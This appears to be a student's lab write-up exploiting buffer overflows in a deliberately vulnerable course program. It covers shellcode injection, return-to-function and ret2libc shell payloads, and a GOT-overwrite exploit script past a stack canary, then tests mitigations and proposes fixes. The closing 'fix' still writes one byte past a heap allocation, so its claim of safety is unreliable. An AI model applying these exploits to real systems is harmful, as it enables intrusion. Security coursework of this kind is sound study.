# Task 1 – Black-Box Analysis
### Findings:
#### 🔹 1. `add` command — Password Parameter
```
./build/bin/btu add Alice Smith 12345 $(python3 -c "print('A'*300)")
```

**Observation:**
- Program crashed with: `zsh: segmentation fault`
**Conclusion:**
- The `password` parameter in the `add` function causes a **stack-based buffer overflow** when given excessive input.
---
#### 🔹 2. `remove` command — Password Parameter
```
./build/bin/btu remove 12345 $(python3 -c "print('A'*300)")
```
**Observation:**
- Program crashed with: `zsh: segmentation fault`
**Conclusion:**
- The `password` parameter in the `remove` function is also vulnerable to a **stack-based buffer overflow**
# Task 1 – White-Box Analysis
## 1. `add` 
- File: `University.cpp`
- **Vulnerable Line**:
```
strcpy(record->password, std::string(password).c_str());
```
- ![[Pasted image 20250528220743.png]]
### Vulnerable Buffer:
- From `Student.h`
```
const static unsigned int MAX_PASSWORD_LENGTH = 32;
char password[MAX_PASSWORD_LENGTH];
```
- `password` is a **fixed-size buffer of 32 bytes**, stored **on the stack**.
- `strcpy(...)` copies input **without checking its size**.
- If the input string is longer than 31 characters (`+1` for `\0`), **a stack-based buffer overflow occurs**.
## 2. `remove`
### Exact Line Responsible for the Vulnerability
- From the main function
```
f (strcmp(argv[1], OPTION_REMOVE) == 0)
{
	if (argc != 4)
	{
		std::cout << "usage: btu remove ID pass" << std::endl;
		return 0;
	}
	std::cout << "Removing Student from database..." << std::endl;
	btu.request_exmatriculation(std::stoul(argv[2], nullptr, 0), argv[3]);
}
```
- → Calls:
```
University::request_exmatriculation(id, password)
```
- Here’s the actual vulnerable function used by `btu remove`
```
void University::request_exmatriculation(const unsigned int id, const char* const password)
{
	std::map<const unsigned int,Student*>::const_iterator citer = student_records.find(id);
	if(citer != student_records.end())
	{
		if(::check_password(citer->second, password))
		{
			exmatriculate(citer->first);
		}
		else
		{
			std::cout << "Invalid password!" << std::endl;
		}
	}
	else
	{
		std::cout << "No Student with id " << id
				  << " imatriculated at "  << name
				  << std::endl;
	}
}

```
- And here’s the real **vulnerability**:
```
bool check_password(const Student *const student, const char* const password)
{
	char lhs[Student::MAX_PASSWORD_LENGTH]; // 32 bytes
	char rhs[Student::MAX_PASSWORD_LENGTH]; // 32 bytes
	strcpy(rhs, student->password);         
strcpy(lhs, password);                     // 💥 NOT safe!
```
- ![[Pasted image 20250528234950.png]]
### 💣 Vulnerability:
This is a classic **stack-based buffer overflow**, because:
- It uses `strcpy(lhs, password)` to copy the string without bounds checking.
- If the user supplies a password longer than 32 bytes, it will overflow into:
    
    - `lhs[32]`
        
    - saved `EBP`
        
    - the **return address**

### Buffer Sizes and Memory Details
![[Pasted image 20250602121954.png]]
### Memory Layout of Stack in `check_password`
```
[HIGH MEMORY]
+------------------------+ ← return address (overwritten if > 52 bytes)
| RET (4 bytes)          |
+------------------------+
| saved EBP              |
+------------------------+
| rhs[32]                |
+------------------------+
| lhs[32]                | ← vulnerable buffer starts here
+------------------------+
| check (4 bytes)        |
+------------------------+
[LOW MEMORY]

```
### Offset
```
gdb --args ./build/bin/btu remove 2468 test
```
- Once inside GDB, do
```
break check_password
run
```
- Print the Address of the Vulnerable Buffer `lhs`
```
print &lhs
```
![[Pasted image 20250602122359.png]]
- Print the Address of the Saved Return Address
```
print $ebp + 4
```
![[Pasted image 20250602122638.png]]
- calculate the offset (in bytes) between the start of `lhs` and the RET address
```
print (char*)($ebp + 4) - (char*)&lhs
```
- ![[Pasted image 20250602122748.png]]
```
0x34 = 52 in deciaml 
```
- contruct payload
```
gdb --args ./build/bin/btu remove 2468 $(python3 -c 'print("A"*52 + "BBBB")')
```
![[Pasted image 20250602122953.png]]
# Task 2 
## Makefile
```
-m32 -pedantic-errors -Wall -Wextra -Werror -U_FORTIFY_SOURCE -z execstack -fno-stack-protector -no-pie -Wl,-z,norelro
```
- commands
```
gdb --args ./build/bin/btu remove 2468  dummy 
checksec
```
![[Pasted image 20250605143525.png]]


## Final Payload
![[Pasted image 20250603082902.png]]

```
gdb --args ./build/bin/btu remove 2468 test
```

```
print $ebp + 4   ## to get return adress 0x80566fc
```

```
echo -ne "\x31\xc0\xb0\x01\x31\xdb\xb3\x05\xcd\x80\
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\
\x90\x90\
\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\
\x8c\xce\xff\xff" > task2payload.bin
```

- in gdb
```
gdb --args ./build/bin/btu remove 2936655109 "$(cat task2payload.bin)"
```
- Set a breakpoint after the overflow
- نوقف التنفيذ بعد ما البافر يتم ملؤه، وقبل ما البرنامج يحاول يعمل `return`، علشان نقدر نفحص الـstack ونتأكد إن كل حاجة اتكتبت صح (shellcode, RET address...).
```
b src/University/University.cpp:199
run
```
- Verify the stack
![[Pasted image 20250603083414.png]]
- Dump the stack to look for the shellcode
```
x/80xb $esp
```
- continue
```
continue
```
![[Pasted image 20250603083540.png]]

## examining what happens if you enable certain protections against buffer overflows again.
### a) Non-Executable Stack (NX)
#### 🔍 What it does:
- Marks the **stack** region of memory as **non-executable**.
- Any code (like your shellcode) placed on the stack **cannot be executed**.
#### Effect on your attack:
- **Breaks the attack completely**.
- Even if you successfully overwrite the return address to jump to your shellcode, the CPU will throw a **segmentation fault** because execution on the stack is forbidden.
#### Test: Non-Executable Stack (NX)
- Open `Makefile`
- In `CXXFLAGS`, remove
```
-z execstack
```
- then run makefile
```
make clean && make debug
```

![[Pasted image 20250603102240.png]]
- now we try the attack 
```
gdb --args ./build/bin/btu remove 2468 "$(cat payload.bin)"
```
- ![[Pasted image 20250603102711.png]]
- we get **Segmentation fault**,
- because the return address pointing to a place in the stack which is not excutable, so it will cause the system to crash
### b) StackGuard (a.k.a. Stack Canary)
#### 🔍 What it does:
- Adds a **random 4-byte "canary" value** just before the saved return address on the stack.
- When a function returns, it **checks the canary** — if it's changed, the program **aborts immediately**.
#### Effect on your attack:
- **Completely detects and stops the attack**.
- Your overflow will overwrite the canary and the return address.
- The canary check fails → program exits with a "stack smashing detected" error.
- The program terminates before your shellcode can run.
#### Test: StackGuard
- Remove this flag from `CXXFLAGS`
```
-fno-stack-protector
```
- and add this
```
-fstack-protector-all
```
- then run makefile
```
make clean && make debug
```
![[Pasted image 20250603103713.png]]

- and run the attack again
```
./build/bin/btu remove 1234 $(python3 -c 'print("A"*1000)'))
```
![[Pasted image 20250603104850.png]]
![[Pasted image 20250603105017.png]]

- program hit **`__stack_chk_fail()`**
- It called `abort()` → which raised `SIGABRT`
- GDB stopped in the syscall that kills the program
- the value of the gaurd will be changed, so the program will call **__stack_chk_fail()** which will return false from the program
- When the compiler inserts a canary into a function, it also adds this check just before the function returns
```
if (__stack_chk_guard != stack_canary_on_stack) {
    __stack_chk_fail();  // ← This is where the program crashes!
}
```
-  `__stack_chk_guard` → the original canary value (stored globally)
- `stack_canary_on_stack` → value in the stack (might have been overwritten)
### c) Address Space Layout Randomization (ASLR)
#### 🔍 What it does:
**ASLR (Address Space Layout Randomization)** randomizes the memory layout of the process **every time it runs**, including:
- Stack
- Heap
- Libraries
- Executable
- Makes it **hard to guess** the correct address to jump to (like the shellcode).
- **PIE** stands for **Position-Independent Executable**.
- When PIE is enabled:
    - Your program's code is loaded at a **random address** in memory **each time it runs**.
    - This makes it harder for attackers to know where your code (like functions) lives.
    - PIE is a **security feature** used to support **ASLR** (Address Space Layout Randomization).

#### Effect on your attack:
- **Usually breaks the attack** unless you disable ASLR or brute-force the address.
- Your return address (e.g., `0xffffce88`) will be wrong most of the time → crash.
- It makes the exploit unreliable but not impossible.
#### Test ASLR
- Make sure ASLR is enabled
```
cat /proc/sys/kernel/randomize_va_space
```
![[Pasted image 20250603110129.png]]
- Check that your binary is not PIE
- This means the program is not position-independent — **only the stack/heap are randomized**, which is exactly what we want to test.

![[Pasted image 20250603110225.png]]
- Run the program multiple times in GDB and print &lhs
```
set disable-randomization off    # Ensure ASLR is active even in GDB
b check_password
run
print &lhs
```
- first time
![[Pasted image 20250603110446.png]]
- second time 
 ![[Pasted image 20250603110521.png]]
 - Third time
![[Pasted image 20250603110625.png]]
- this proves that the **stack address changes each run** → ASLR is working.
- now Run  exploit 
- ![[Pasted image 20250603110804.png]]
- the same exploit that worked before is now at fault due to aslr 
# Task 3.1 : Return to function attack

- Our goal is Exploit the `remove` function to **call a different function (`exmatriculate`)** _without knowing the password_ and _without injecting shellcode_.
- You **overwrite the return address** to call a **function that already exists in your binary**

## Makefile
```
CXXFLAGS := -m32 -pedantic-errors -Wall -Wextra -Werror -U_FORTIFY_SOURCE -z noexecstack -fno-stack-protector -no-pie -Wl,-z,norelro
```
## What is `exmatriculate()`
- It’s a **member function** of the `University` clas
```
class University {
  ...
  void exmatriculate(long id);
};
```
- Unlike normal functions, **member functions** need to know _which object_ they are working on.
- So when you call:

```
btu.exmatriculate(0x6a451cff); 
```
- the compiler turns it into something like
```
exmatriculate(&btu, 0x6a451cff);
```
- `&btu` → is the `this` pointer, i.e., a pointer to the object of type `University`.
- `0x6a451cff` → is the student ID passed as a parameter.
## Steps and Exploit Plan
- To call `exmatriculate(unsigned int id)` manually through the stack, we must fake a function call by **setting up the stack exactly as the compiler would**.
     - In C++ on x86: Member functions receive the object pointer (`this`) as the first argument (in memory, pushed last).
     - The actual function argument(s) (e.g. `id`) are pushed after that.
     - The return address is placed just after the vulnerable buffer and saved EBP.
- So we need to 
     - Find the address of the `exmatriculate()` function.
     - Overflow the password buffer to overwrite the return address.
     - Replace it with the address of `exmatriculate()` — a **return-to-function attack**.
     - Pass it the correct `student_id` (e.g., Klaus Komisch's ID).
     - Cleanly exit the program using a call to `exit()`.

## First : Understand the Function Signature
```
void University::exmatriculate(unsigned int id)
```
This function needs **two things to work properly**:
1. A valid `this` pointer to the `University` object (so it knows which instance it's acting on)
2. A valid `id` as argument (in this case: `1782914303`)

## 1. Now  Find the address of the `exmatriculate()` function.
```
gdb --args ./build/bin/btu remove 2468  dummy   
p University::exmatriculate
```
![[Pasted image 20250603183827.png]]
## 2.  `exit()` function address
- After `exmatriculate()` finishes, the program would normally "return" — so the next address on the stack is where it jumps.
- If we don’t control this, the program will crash or segfault.
- We provide the address of `exit()` as the **return address after `exmatriculate()`**, so the program exits cleanly.
```
gdb --args ./build/bin/btu remove 2468  dummy   
run
p &exit
```
![[Pasted image 20250603184009.png]]
## 3. Address of the global `University` object (`btu`) (this)
- `exmatriculate()` is a **member function** — it needs to operate on a `University` object.
- The object is stored in a global variable called `btu`.
- So when the function is called, the `this` pointer must be passed as its first argument (according to C++ calling convention on x86).
```
gdb --args ./build/bin/btu remove 2468  dummy   
run
p &btu
```
![[Pasted image 20250603184922.png]]
## 4. Klaus Komisch’s ID: `1782914303 = 6A451CFF`
- - This is the actual student we want to exmatriculate. 
- In the C++ function call, this is the second argument after `this`.
## The payload
- Instead of using `print()` which adds newlines and encodes data, we use:
```
sys.stdout.buffer.write()
```
- this sends the exact binary payload to `stdout` — and we redirect it to a binary file.
- Final Payload Generator
```
 python3 -c 'import sys; sys.stdout.buffer.write(
    b"\x90"*52 +                      # NOP sled (52 bytes)
    b"\x80\xb0\x04\x08" +             # exmatriculate() → 0x0804b080
    b"\xd0\xaa\xaf\xf7" +             # exit()          → 0xf7afaad0
    b"\x60\x0c\x05\x08" +             # this pointer    → 0x08050c60
    b"\xff\x1c\x45\x6a"               # student ID      → 0x6a451cff
)' > task3payload.bin
```
## Command
```
./build/bin/btu remove 2468 "$(cat task3payload.bin)"
```
## Result
![[Pasted image 20250603190218.png]]
# Task 3.2 : Ret2libc: Spawn a Shell with `system("/bin/sh")`
- In this task, instead of calling a program function like `exmatriculate()`, we will:
     - **Call the `system()` function from libc with the argument `"/bin/sh"`**
     - **NX** prevents injected shellcode.
     - But we can **reuse existing code** in libc.
     - `system("/bin/sh")` is a one-line way to get a shell.
     - Just like before, we overflow the buffer and hijack control flow.
## What is `libc`?
- **`libc`** (short for **the C standard library**) is a shared library that provides **common C functions**, like
    - `printf()`
    - `scanf()`
    - `system()`
    - `exit()`
    - `strcpy()`  
    …and many others.
## What is a **Return-to-libc Attack**?
- It’s a type of exploit where the attacker:
    1. Doesn’t inject shellcode (because stack might be non-executable)
    2. Instead, they **reuse existing code in `libc`**
    3. They overwrite the **return address** to call something like

```
system("/bin/sh")
```
- payload of libc
```
return address = address of system() in libc
next 4 bytes  = address of exit() (to avoid crash)
next 4 bytes  = address of string "/bin/sh"
```
## Step-by-Step Setup
### Step 1: Find Address of `system()` in libc
```
gdb --args ./build/bin/btu remove 2468  dummy  
run
p &system
```
![[Pasted image 20250603193609.png]]

### Find Address of `exit()` in libc

```
p &exit
```
![[Pasted image 20250603193642.png]]
### Step 3: Find Address of `"/bin/sh"` in memory
- Run this in your terminal **before launching GDB**:
```
export MYSHELL=/bin/sh
export SHELL=/bin/sh
```
- now go to gdb 
```
gdb --args ./build/bin/btu remove 2468 test
b main
r
find "/bin/sh"
```
![[Pasted image 20250603203133.png]]
### Python script for payload
```
#!/usr/bin/python3
from sys import stdout

payload = bytearray()

# Fill buffer (32 bytes) + saved EBP (4 bytes) + 16 to reach return and arguments
payload += b"\x90" * 52

# Overwrite RET → system()
payload += (0xf7b0e220).to_bytes(4, 'little')

# Return from system() → exit()
payload += (0xf7afaad0).to_bytes(4, 'little')

# Argument for system(): pointer to "/bin/sh"
payload += (0xffffdf8d).to_bytes(4, 'little')

stdout.buffer.write(payload)
```
- then 
### Command
```
python3 task3.2.py > payloadtask3.2.bin  
gdb --args ./build/bin/btu remove 1234 "$(cat payloadtask3.2.bin)"
```
![[Pasted image 20250603203509.png]]
- and we got a shell
# Task 4

## Step 1: Modify the `Makefile`
```
CXXFLAGS := -m32 -pedantic-errors -Wall -Wextra -Werror -U_FORTIFY_SOURCE -fstack-protector -no-pie -z noexecstack -Wl,-z,norelro
```
## Step 2: Clean and Rebuild
```
make clean && make debug
```
- Inside GDB:
![[Pasted image 20250603211347.png]]

## Step 3 : Identify the Vulnerability
```
void University::add_student(const char *name,
                             const char *last_name,
                             const unsigned int id,
                             const char *password,
                             const bool notify)
{
    Student* record = new Student;
    record->name = new char[strlen(name)];
    record->last_name = new char[strlen(last_name)];

    strcpy(record->password, std::string(password).c_str());  // VULN 1
    strcpy(record->name, name);                               // VULN 2
    strcpy(record->last_name, last_name);                     // VULN 3
}
```
- so now we can see that from the student struct 
- ![[Pasted image 20250605163404.png]]
    - **password**: is defined in the stack
    - **record->name** : is defined in the heap dynamically allocated
    - **record->last_name** : is defined in the heap dynamically allocated
- By overflowing the `password` buffer, you can **overwrite the `name` or `last_name` pointer**, which allows
```
strcpy((char*)ARBITRARY_ADDRESS, "controlled_string");
```

### Exploitation Flow
- **Input a long `password`** (more than 32 bytes) to overflow and overwrite:
    - `id`
    - `last_name` pointer
    - `name` pointer
- **Overwrite `record->name`** with an address like `0xffffabcd`
- **Control the `name` input**, e.g., `"islam"`
- When the program executes
```
strcpy(record->name, name);
```
- It becomes:
```
strcpy((char*)0xffffabcd, "islam");  // 🎯 Arbitrary Write

```
### Payload Construction
- The arguments to the vulnerable `add` command were crafted as follows:
- `password` argument (argv[5]):    
    - 32 bytes of padding to fill `password`
    - 4 bytes of junk to overwrite `id`
    - 4 bytes: `0xFFFFABCD` → overwrites `record->last_name`
    - 4 bytes: junk for `record->name` (not used)
- `last_name` argument (argv[3]):
    - The string `\xef\xbe\xad\xde` (i.e., `0xDEADBEEF` in little-endian)
### Result
```
gdb --args ./build/bin/btu add hamada "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\\xef\\xbe\\xad\\xde")')" 5555 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\\x61"*32 + b"\\xaa\\xaa\\xaa\\xaa" + b"\\xcd\\xab\\xff\\xff")')"

gdb --args ./build/bin/btu add islam "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xef\xbe\xad\xde")')"  5555 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\xaa\xaa\xaa\xaa\xcd\xab\xff\xff")')"

x 0xffffabcd
```
![[Pasted image 20250604015854.png]]

## Sneaking past the StackGuard.
- Using the previously demonstrated arbitrary write, we now redirect program control flow to call `University::exmatriculate(1782914303)` without supplying the correct password — even though **StackGuard** and **NX** are enabled.
- To achieve this, we overwrite a **function pointer** used in the execution path — specifically, an entry in the **Global Offset Table (GOT)**.
### Understanding the GOT
- The **Global Offset Table (GOT)** is a memory structure used in dynamically linked programs to store the **runtime-resolved addresses** of external functions like `printf()`, `exit()`, or `puts()`.
- When the program calls a function like `puts("hi")`, it actually does:
```
jmp *puts@GOT
```
- Instead of calling the hardcoded address, it **jumps to the GOT entry**, which is filled in at runtime with the actual address.
- Thus, if we **overwrite a GOT entry** (e.g., `puts@GOT`) with a pointer to `exmatriculate()`, the next time `puts()` is called, it will **actually call `exmatriculate()`** — which is our goal.
### Applying the Theory: GOT Hijacking in Practice
- We inspect the `add_student()` function to identify any external functions that are invoked afterward:
```
disas University::add_student
```
- Identify the GOT Entry of a Suitable Function
```
readelf -r ./build/bin/btu | grep 'exit\|puts\|write_log'
```
![[Pasted image 20250604020657.png]]
- we can see that it jumps to the address 0x08050ba4
- now lets get the address of _exmatriculate()_
```
0x08050ba4 writelog
0x0804b180 exmatr
0xffffcf04 heap
```

```
p University::exmatriculate(unsigned int) 
```
![[Pasted image 20250604021314.png]]
## Exploit Script
```
#!/usr/bin/env python3

import subprocess

# Define raw values
password = b'\x61' * 32                      # 'a' * 32
student_id = b'\xff\x1c\x45\x6a'             # Klaus ID
got_write_log = b'\xa4\x0b\x05\x08'          # 0x08050ba4
dummy_heap = b'\x04\xcf\xff\xff'             # valid memory
exmatriculate = b'\x80\xb1\x04\x08'          # 0x0804b180

# Build final arguments
payload_password = password + student_id + got_write_log + dummy_heap
payload_lastname = exmatriculate

# Convert to escaped hex
hexify = lambda b: ''.join(f'\\x{c:02x}' for c in b)

# Final command
cmd = (
    "gdb --args ./build/bin/btu add Islam "
    f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{hexify(payload_lastname)}\")')\" "
    "5555 "
    f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{hexify(payload_password)}\")')\""
)

print("[+] Running:")
print(cmd)
subprocess.run(cmd, shell=True)

```
- voilaa
- ![[Pasted image 20250604035118.png]]
# Task 5 
### Examining the Issues
- The root cause in both exploited cases is the use of **unsafe memory copy functions**, particularly `strcpy()`, which does not enforce size checks. This leads to two key problems:
    - **Overflowing fixed-size buffers** (like `Student::password`)
    - **Overwriting adjacent pointers in the heap** (like `name` and `last_name`) through buffer overflows
### Fix 1: Securing `check_password()`
- Before Fix:
```
strcpy(rhs, student->password);
strcpy(lhs, password); // 🔥 vulnerable
```
- After Fix:
```
if (strlen(password) < sizeof(rhs)) {
    strncpy(rhs, student->password, sizeof(rhs) - 1);
    rhs[sizeof(rhs) - 1] = '\0';

    strncpy(lhs, password, sizeof(lhs) - 1);
    lhs[sizeof(lhs) - 1] = '\0';
}
```
- This prevents overflow by copying only up to the destination buffer’s length minus 1, and manually null-terminating the result.
- enforce null-termination?
    - Because `strncpy()` does not guarantee it when the input string is as long as or longer than the destination buffer.
### Fix 2: Securing `add_student()`
```
strcpy(record->password, std::string(password).c_str());
strcpy(record->name, name);
strcpy(record->last_name, last_name); // 🔥 vulnerable if `record->last_name` pointer was overwritten
```
- After Fix:
```
if (strlen(password) < sizeof(record->password)) {
    strncpy(record->password, std::string(password).c_str(), sizeof(record->password) - 1);
    record->password[sizeof(record->password) - 1] = '\0';
}

// name and last_name are dynamically allocated, so bounds checking isn't feasible
// but we still enforce null-termination after copying

strncpy(record->name, name, strlen(name));
record->name[strlen(name)] = '\0';

strncpy(record->last_name, last_name, strlen(last_name));
record->last_name[strlen(last_name)] = '\0';
```

- By replacing all unbounded memory copy operations with safe alternatives (`strncpy()` with size checks and explicit null-termination), we successfully eliminate the vulnerabilities exploited in previous tasks. These minimal changes preserve the logic of the application, while hardening it against real-world attack vectors — reflecting the secure-by-design principle.

